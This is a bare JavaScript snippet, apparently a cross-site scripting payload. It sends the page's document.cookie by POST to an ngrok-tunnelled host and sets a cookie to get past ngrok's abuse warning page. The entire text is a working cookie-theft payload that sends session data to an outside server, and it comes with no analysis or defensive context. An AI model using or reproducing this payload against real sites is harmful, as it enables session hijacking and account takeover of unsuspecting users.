fetch("https://5e65-24-133-64-217.ngrok-free.app/", {
      method: "post",
      headers: {
        'Cookie':'abuse_interstitial=5e65-24-133-64-217.ngrok-free.app',
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({ doc:document.cookie }),
    });
